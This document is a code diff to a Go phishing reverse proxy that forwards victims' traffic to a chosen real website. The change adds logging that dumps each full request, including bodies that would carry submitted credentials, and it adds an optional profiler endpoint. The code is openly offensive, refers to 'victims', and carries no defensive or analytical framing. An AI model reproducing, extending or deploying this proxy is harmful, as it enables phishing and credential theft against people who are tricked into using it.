@@ -7,12 +7,14 @@ import (
 	"net"
 	"net/http"
 	"net/http/httputil"
+	_ "net/http/pprof"
 	"net/url"
 	"time"
 )
 
 var targetURL = flag.String("target", "", "The website we want to phish")
 var address = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
+var attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
 
 // Phishes a target URL with a custom HTTP client.
 type PhishingProxy struct {
@@ -20,7 +22,16 @@ type PhishingProxy struct {
 	targetURL *url.URL
 }
 
-func (p *PhishingProxy) HandleRequest(conn net.Conn) {
+func (p *PhishingProxy) rewriteHeaders(request *http.Request) {
+	request.URL.Scheme = p.targetURL.Scheme
+	request.URL.Host = p.targetURL.Host
+	request.Host = p.targetURL.Host
+	// Prevent panics, see: https://stackoverflow.com/questions/19595860/http-request-requesturi-field-when-making-request-in-go
+	request.RequestURI = ""
+}
+
+func (p *PhishingProxy) HandleConnection(conn net.Conn) {
+	defer conn.Close()
 	reader := bufio.NewReader(conn)
 	request, err := http.ReadRequest(reader)
 	if err != nil {
@@ -28,33 +39,28 @@ func (p *PhishingProxy) HandleRequest(conn net.Conn) {
 		return
 	}
 
-	request.URL.Scheme = p.targetURL.Scheme
-	request.URL.Host = p.targetURL.Host
-	request.Host = p.targetURL.Host
-	log.Println("Sending", request.Method, "request to", request.URL.String())
-
-	// Prevent panics, see: https://stackoverflow.com/questions/19595860/http-request-requesturi-field-when-making-request-in-go
-	request.RequestURI = ""
+	p.rewriteHeaders(request)
+	r, err := httputil.DumpRequest(request, true)
+	if err != nil {
+		log.Println("Error dumping request to console.")
+	}
+	log.Println(string(r))
 	resp, err := p.client.Do(request)
 	if err != nil {
 		log.Println("Proxy error:", err.Error())
 		return
 	}
 
-	log.Println("Got response", resp.Status)
-	responseBody, err := httputil.DumpResponse(resp, true)
+	log.Println(request.URL, "-", resp.Status)
+	modifiedResponse, err := httputil.DumpResponse(resp, true)
 	if err != nil {
 		log.Println("Error converting requests to bytes:", err.Error())
 		return
 	}
-	_, err = conn.Write(responseBody)
+
+	_, err = conn.Write(modifiedResponse)
 	if err != nil {
 		log.Println("Error responding to victim:", err.Error())
-		return
-	}
-	err = conn.Close()
-	if err != nil {
-		log.Println("Error closing connection: ", err.Error())
 		return
 	}
 }
@@ -80,11 +86,19 @@ func main() {
 		client:    client,
 		targetURL: u,
 	}
+
+	if *attachProfiler {
+		go func() {
+			log.Println("Starting profiler.")
+			log.Println(http.ListenAndServe("localhost:6060", nil))
+		}()
+	}
+
 	for {
 		conn, err := server.Accept()
 		if err != nil {
-			log.Println("Error when accepting request, ", err.Error())
+			log.Println("Error when accepting request,", err.Error())
 		}
-		go phishingProxy.HandleRequest(conn)
+		go phishingProxy.HandleConnection(conn)
 	}
 }
